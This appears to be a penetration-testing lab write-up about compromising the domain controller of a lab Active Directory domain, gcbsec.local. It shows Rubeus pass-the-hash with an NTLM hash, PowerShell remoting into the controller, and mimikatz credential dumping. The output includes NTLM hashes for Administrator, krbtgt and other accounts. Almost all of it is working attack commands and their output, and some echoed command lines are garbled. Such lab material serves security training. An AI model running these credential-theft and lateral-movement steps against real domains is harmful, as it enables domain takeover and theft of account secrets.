---
layout: default
---

## sec-dc.gcbsec.local 192.168.144.1

The syslogagent user extracted on the previous lab belong to Enterprise Admins of gcbsec.local domain:


### 1. Enumerate secsyslogagent user

```
PS C:\Windows\system32> net group "Enterprise Admins" /domain
The request will be processed at a domain controller for domain gcbsec.local.

Group name     Enterprise Admins
Comment        Designated administrators of the enterprise

Members

-------------------------------------------------------------------------------
Administrator            syslogagent
The command completed successfully.

```

```
PS C:\Windows\system32> PS C:\Windows\system32> net user "syslogagent" /domain
e sr"ylggn"/oanThe request will be processed at a domain controller for domain gcbsec.local.

User name                    syslogagent
Full Name                    syslogagent
Comment                      We take security very seriously
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/19/2019 8:45:25 PM
Password expires             Never
Password changeable          6/20/2019 8:45:25 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/25/2024 4:36:43 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Enterprise Admins    *Domain Users
The command completed successfully.
```

### 2. Impersonate secsyslogagent user

From sec-syslog01.gcbsec.local impersonate secsyslogagent:
```
PS C:\Windows\system32> C:\Rubeus.exe asktgt /user:syslogagent /domain:gcbsec.local /ntlm:58a478135a93ac3bf058a5ea0e8fdb71 /ptt
:Rbu.x stt/srssoaet/oangbe.ocl/tm5a7159a3f5ae08d7 pt
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 58a478135a93ac3bf058a5ea0e8fdb71
[*] Building AS-REQ (w/ preauth) for: 'gcbsec.local\syslogagent'
[*] Using domain controller: 192.168.144.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/gcbsec.local
  ServiceRealm             :  GCBSEC.LOCAL
  UserName                 :  syslogagent
  UserRealm                :  GCBSEC.LOCAL
  StartTime                :  7/25/2024 4:41:53 AM
  EndTime                  :  7/25/2024 2:41:53 PM
  RenewTill                :  8/1/2024 4:41:53 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  C5cMTZ9iJgVCEOb/2oYlEg==
  ASREP (key)              :  58A478135A93AC3BF058A5EA0E8FDB71

```

### 3. Access to the target sec-dc.gcbsec.local 

Using PSSession with kerberos ticket secsyslog for access to sec-dc.gcbsec.local

```
PS C:\Windows\system32> Enter-PSSession -ComputerName sec-dc.gcbsec.local
[sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents> [sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents> whoami
haisec\syslogagent
[sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents>
[sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents> ipconfig
pofg
Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::ae60:2f9f:dd6e:90a8%3
   IPv4 Address. . . . . . . . . . . : 192.168.144.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.144.254
```



### 4. Bypass AV and dump domain account hashes

```
[sec-dc.gcbsec.local]: PS C:\Users\syslogagent\Documents> powershell -c C:\mimikatz2.exe "privilege::debug" "sekurlsa::logonPasswords" "exit"
oesel- :mmkt2ee"rvlg:eu""eula:ooPsod ei"
  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonPasswords

Authentication Id : 0 ; 48918 (00000000:0000bf16)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 31463 (00000000:00007ae7)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 31371 (00000000:00007a8b)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 31323 (00000000:00007a5b)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 2278946 (00000000:0022c622)
Session           : RemoteInteractive from 2
User Name         : administrator
Domain            : SEC
Logon Server      : SEC-DC
Logon Time        : 4/29/2024 12:14:43 AM
SID               : S-1-5-21-4056425676-3036975250-1243519898-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : SEC
         * NTLM     : 4b28caca2273087d23d45d54b48e17ff
         * SHA1     : 268074612877c2e81d65e2b9f79ce567ed746090
         * DPAPI    : 36c4c075b2eaac4ce247e500a2034c11
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : GCBSEC.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 31452 (00000000:00007adc)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 27515 (00000000:00006b7b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:50 PM
SID               :
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SEC-DC$
Domain            : SEC
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:50 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : sec-dc$
         * Domain   : GCBSEC.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2219791 (00000000:0021df0f)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:14:27 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SEC-DC$
Domain            : SEC
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : sec-dc$
         * Domain   : GCBSEC.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 2223458 (00000000:0021ed62)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:14:28 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 2223438 (00000000:0021ed4e)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:14:28 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 2219745 (00000000:0021dee1)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:14:27 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 48890 (00000000:0000befa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:50:52 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : SEC-DC$
         * Domain   : SEC
         * NTLM     : 70f6cdea590b81addc10fdc04a701fca
         * SHA1     : cb85408ab382f76ebbea65915143830f887ee468
         * DPAPI    : cb85408ab382f76ebbea65915143830f
        tspkg :
        wdigest :
         * Username : SEC-DC$
         * Domain   : SEC
         * Password : (null)
        kerberos :
         * Username : SEC-DC$
         * Domain   : gcbsec.local
         * Password : 5e 6d d0 11 91 8b 5d fa 3c 5c 8c b3 24 3a 71 de 69 01 1b eb ca 9c 13 10 67 2c a6 73 58 04 31 01 5e 9b e0 61 ba ca 03 99 a6 72 05 32 9b eb 41 4b 02 2d 92 8c 14 c0 c4 f6 79 17 32 05 3f 7b b7 56 51 3e f9 1d d5 7d 1b 17 f3 98 a9 4c da ba bd 9e db fd c2 37 15 f6 15 d6 e0 2f 0a 34 a9 43 f2 d1 46 40 ea 02 c9 77 9d 94 ee 19 da e9 ae 2c 54 d9 91 b6 ad dd 35 ed b4 8a c1 ab 7e 7c 70 97 7a 3c 47 06 31 61 cc 0b 99 df 60 d0 71 bc 54 ca 9f 00 d6 35 20 84 b3 00 48 a9 4a 68 85 a1 ba 55 a4 c0 23 00 ce 14 69 19 12 8a cc 47 75 d8 f4 00 f9 8a ad c1 d3 a5 4f e1 4c 0b b6 33 eb fd 85 61 01 34 cb ac 9e e4 59 52 1f ae 07 aa 06 3b 03 27 2a a8 24 88 2b fa be 6c 28 f8 3b 34 87 a9 f2 ff 60 71 51 64 ee 3e e9 fe 3a 06 ad d7 41 3c e1 0e 14 2a
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```

```
 lsadump::lsa /patch
Domain : SEC / S-1-5-21-4056425676-3036975250-1243519898

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 4b28caca2273087d23d45d54b48e17ff

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : da6010de93e6e1c94bdd90bb42a9920e

RID  : 00000450 (1104)
User : secadmin
LM   :
NTLM : 60b313513b0ca88f757e2e30bba22eb9

RID  : 00000451 (1105)
User : syslogagent
LM   :
NTLM : 58a478135a93ac3bf058a5ea0e8fdb71

RID  : 00000452 (1106)
User : logagent
LM   :
NTLM : 58a478135a93ac3bf058a5ea0e8fdb71

RID  : 000003e8 (1000)
User : SEC-DC$
LM   :
NTLM : 70f6cdea590b81addc10fdc04a701fca

